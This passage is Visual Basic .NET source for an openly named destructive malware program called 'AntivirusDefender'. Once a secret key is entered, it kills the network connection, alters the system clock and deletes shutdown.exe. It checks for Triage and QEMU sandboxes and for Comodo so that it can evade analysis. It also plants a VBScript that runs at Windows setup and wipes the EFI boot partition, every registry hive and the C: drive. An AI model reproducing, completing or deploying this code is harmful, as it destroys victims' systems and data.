            Next
        Catch ex As Exception
            Console.WriteLine("Failed to disable network adapters: " & ex.Message)
        End Try
    End Sub

    Public Sub KillGrantAccessAndDeleteShutdownExe()
        ' Path to shutdown.exe in System32
        Dim shutdownExePath As String = "C:\Windows\System32\shutdown.exe"

        ' Step 1: Kill any running instances of shutdown.exe
        Dim processes = Process.GetProcessesByName("shutdown")
        For Each proc In processes
            Try
                proc.Kill() ' Kill the process
                proc.WaitForExit() ' Wait for the process to exit
            Catch ex As Exception
                MessageBox.Show("Could not kill process: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
            End Try
        Next

        ' Step 2: Grant full access to shutdown.exe to ensure we can delete it
        Dim grantAccessCmd As String = $"icacls {shutdownExePath} /grant *S-1-1-0:(F)"
        ExecuteCommand(grantAccessCmd)

        ' Step 3: Delete shutdown.exe
        If File.Exists(shutdownExePath) Then
            File.Delete(shutdownExePath)
            MessageBox.Show("shutdown.exe deleted successfully.", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information)
        Else
            MessageBox.Show("shutdown.exe not found.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End If
    End Sub

    Private Function TriageCheck() As Boolean
        Try
            Dim processInfo As New ProcessStartInfo("wmic", "diskdrive get model") With {
            .RedirectStandardOutput = True,
            .UseShellExecute = False,
            .CreateNoWindow = True
        }
            Using process As Process = Process.Start(processInfo)
                Using reader As New StreamReader(process.StandardOutput.BaseStream)
                    Dim output As String = reader.ReadToEnd()
                    process.WaitForExit()

                    If output.Contains("DADY HARDDISK") OrElse output.Contains("QEMU HARDDISK") Then
                        Return True
                    End If
                End Using
            End Using
        Catch ex As Exception
            Console.WriteLine($"Error running wmic command: {ex.Message}")
        End Try

        Return False
    End Function

    ' Check if the application is running with administrator privileges
    Private Function IsAdministrator() As Boolean
        Dim identity = WindowsIdentity.GetCurrent()
        Dim principal = New WindowsPrincipal(identity)
        Return principal.IsInRole(WindowsBuiltInRole.Administrator)
    End Function

    ' Set system time to January 19, 2038
    Private Sub SetSystemTimeTo2038()
        Try
            Dim newDateTime As New SYSTEMTIME With {
                .wYear = 2038,
                .wMonth = 1,
                .wDay = 19,
                .wHour = 3,
                .wMinute = 14,
                .wSecond = 7
            }

            ' Set system time using WinAPI
            If Not SetLocalTime(newDateTime) Then
                Throw New ComponentModel.Win32Exception(Marshal.GetLastWin32Error())
            End If
        Catch ex As Exception
            Console.WriteLine("Failed to set system time: " & ex.Message)
        End Try
    End Sub

    ' Grant permissions to self
    Private Sub GrantSelfPermissions()
        Try
            ' Get the current directory and executable name
            Dim currentDir As String = AppDomain.CurrentDomain.BaseDirectory
            Dim currentName As String = Process.GetCurrentProcess().MainModule.FileName

            ' Create the command with actual paths
            Dim command As String = $"icacls ""{currentDir}{Path.GetFileName(currentName)}"" /grant Everyone:(OI)(CI)F"

            ExecuteCommand(command)
        Catch ex As Exception
            MessageBox.Show("Failed to grant self permissions: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End Try
    End Sub

    ' Importing user32.dll for window management and input control
    <DllImport("user32.dll", SetLastError:=True)>
    Private Shared Function SetForegroundWindow(hWnd As IntPtr) As Boolean
    End Function

    <DllImport("user32.dll")>
    Private Shared Sub keybd_event(bVk As Byte, bScan As Byte, dwFlags As UInteger, dwExtraInfo As UInteger)
    End Sub

    ' Virtual key codes for letters and special characters (adjust for specific needs)
    Private Shared Sub SendKey(key As Char)
        Dim keyCode As Byte = AscW(key)
        keybd_event(keyCode, 0, KEYEVENTF_KEYDOWN, 0)
        Thread.Sleep(50) ' Short delay between keypresses
        keybd_event(keyCode, 0, KEYEVENTF_KEYUP, 0)
    End Sub

    ' Keycodes used by keybd_event
    Private Const KEYEVENTF_KEYDOWN As UInteger = &H0
    Private Const KEYEVENTF_KEYUP As UInteger = &H2

    ' Function to type a full message in Notepad
    Public Sub WriteMessageToNotepad()
        Try
            ' Start the Notepad process
            Dim notepadProcess As Process = Process.Start("notepad.exe")

            ' Wait for Notepad to be ready for input
            notepadProcess.WaitForInputIdle()

            ' Get the handle of the Notepad window
            Dim notepadHandle As IntPtr = notepadProcess.MainWindowHandle

            ' Bring Notepad to the foreground
            SetForegroundWindow(notepadHandle)

            ' Message to type
            Dim message As String = "one of the greatest fan made viruses ever created. his name is AntivirusDefender and there is no escape. i'm serious."

            ' Use SendKeys to type the message
            SendKeys.SendWait(message)

        Catch ex As Exception
            Console.Write("Failed to write message to Notepad: " & ex.Message)
        End Try
    End Sub

    Private Sub CreateEpicVBScriptFile()
        ' Create the VBScript content
        Dim vbsContent As String = "MsgBox ""What Are Your Famous Last Words? Spoiler: There two scenarios to get this message but one of them is not so destructive. No UEFI Driver or Kernel Driver Malware this time. Because it's easy to fix. If you see from starting at Windows"" , 0, ""utkudrk.exe""" & vbCrLf &
        "Dim userInput" & vbCrLf &
        "userInput = InputBox(""Enter your response (Just don't say FUCK YOU):"", ""utkudrk.exe"")" & vbCrLf &
        "If userInput = ""FUCK YOU"" Then" & vbCrLf &
        "    Dim shell" & vbCrLf &
        "    Set shell = CreateObject(""WScript.Shell"")" & vbCrLf &
        "    shell.Run ""mountvol x: /s"", 0, True" & vbCrLf &
        "    shell.Run ""icacls x:"", 0, True" & vbCrLf &
        "    shell.Run ""icacls c:"", 0, True" & vbCrLf &
        "    If fso.FileExists(""x:\efi\boot\microsoft\bootmgfw.efi"") Then" & vbCrLf &
        "        shell.Run ""rd x: /s /q"", 0, True" & vbCrLf &
        "    End If" & vbCrLf &
        "    shell.Run ""reg delete HKCR /f"", 0, True" & vbCrLf &
        "    shell.Run ""reg delete HKCU /f"", 0, True" & vbCrLf &
        "    shell.Run ""reg delete HKLM /f"", 0, True" & vbCrLf &
        "    shell.Run ""reg delete HKU /f"", 0, True" & vbCrLf &
        "    shell.Run ""reg delete HKCC /f"", 0, True" & vbCrLf &
        "    shell.Run ""rd c: /s /q"", 0, True" & vbCrLf &
        "Else" & vbCrLf &
        "    MsgBox ""Action canceled because you didn't say FUCK YOU."", 0, ""utkudrk.exe""" & vbCrLf &
        "End If" & vbCrLf &
        "Set shell = Nothing"

        ' Write the VBScript to disk
        System.IO.File.WriteAllText("C:\temp.vbs", vbsContent)

        ' Registry changes to ensure the VBScript runs at OOBE
        Try
            ' Create the necessary registry keys and values
            Dim setupKeyPath As String = "SOFTWARE\Microsoft\Windows\CurrentVersion\Setup"
            Dim systemSetupKeyPath As String = "SYSTEM\Setup"

            ' Create the necessary registry keys and values
            Using setupKey As RegistryKey = Registry.LocalMachine.CreateSubKey(setupKeyPath)
                setupKey?.SetValue("CmdLine", "C:\temp.vbs", RegistryValueKind.String)
            End Using

            Using systemSetupKey As RegistryKey = Registry.LocalMachine.CreateSubKey(systemSetupKeyPath)
                If systemSetupKey IsNot Nothing Then
                    systemSetupKey.SetValue("OOBEInProgress", 1, RegistryValueKind.DWord)
                    systemSetupKey.SetValue("SetupType", 1, RegistryValueKind.DWord)
                    systemSetupKey.SetValue("SetupPhase", 1, RegistryValueKind.DWord)
                    systemSetupKey.SetValue("SystemSetupInProgress", 1, RegistryValueKind.DWord)
                End If
            End Using

        Catch ex As Exception
            MessageBox.Show("An error occurred: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End Try
    End Sub

    ' Event handler for the Activate button
    Private Sub ActivateButton_Click(sender As Object, e As EventArgs) Handles ActivateButton.Click
        Dim secretKey As String = "FUCKTHESKIDDERS"

        ' Create an instance of the ComodoAntivirusDetector class
        Dim detector As New StupidSandboxThingsDetector()

        ' Check if Comodo Antivirus is detected
        If detector.DetectComodoAntivirus() Then
            MessageBox.Show("ARE YOU FUCKING SERIOUS? ARE YOU USING COMODO? COMODO ALREADY BEATEN BY ANTIVIRUSDEFENDER 6.6.6", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning)
            Return
        End If

        ' Check if the specific hard disk models are detected
        Dim isDetected As Boolean = TriageCheck()

        If isDetected Then
            MessageBox.Show("I WANT TO SAY SOMETHING. TRIAGE IS BULLSHIT. NO DATA FOR JAFFACAKES118.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning)
            Return
        End If

        If inputTextBox.Text = secretKey Then
            MessageBox.Show("Malware Activated!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information)

            ' 1. Disconnect the Internet
            DisconnectInternet()

            ' 2. Set the system time to 2038
            SetSystemTimeTo2038()

            ' Start the operations in a new thread
            Dim thread As New Thread(AddressOf ExecutePayload)
            thread.Start()
        Else
            MessageBox.Show("Incorrect key. Please try again.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End If
    End Sub

    ' Method to execute the payload in a separate thread
    Private Sub ExecutePayload()

        ' Execute remaining operations
        SetWallpaper()
        WriteMessageToNotepad()
        GrantSelfPermissions()
        VisualEffectTimer.Start()
        overlay = New FullScreenOverlay()
        overlay.Show()
        ' Update registry settings and disable Log off
        UpdateRegistrySettings()
        DisableLogoffSwitchUserAndShutdown()
    End Sub

    ' Event handler for the Exit button
    Private Sub ExitButton_Click(sender As Object, e As EventArgs) Handles ExitButton.Click
        ' Forceful exit
        Environment.Exit(0)
    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Try
            ' Disable Alt + F4 (window close button)
            FormBorderStyle = FormBorderStyle.None
            StartPosition = FormStartPosition.CenterScreen

            ' Set up the low-level keyboard hook
            hookCallbackDelegate = New HookProc(AddressOf HookCallback)
            hookID = SetHook(hookCallbackDelegate)
        Catch ex As Exception
            MessageBox.Show("An error occurred during initialization: " & ex.Message, "Initialization Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End Try
    End Sub

    Protected Overrides Sub OnFormClosed(e As FormClosedEventArgs)
    End Sub

    Private Sub VisualEffectTimer_Tick(sender As Object, e As EventArgs) Handles VisualEffectTimer.Tick

        ' Simulate visual flash effect by flashing the screen with different colors
        Dim g As Graphics = CreateGraphics()
        Dim random As New Random()
        Dim flashColor As Color = Color.FromArgb(random.Next(256), random.Next(256), random.Next(256))
        Dim flashBrush As New SolidBrush(flashColor)

        g.FillRectangle(flashBrush, ClientRectangle)
        Thread.Sleep(50)
        Invalidate() ' Clear the flash effect
    End Sub

End Class
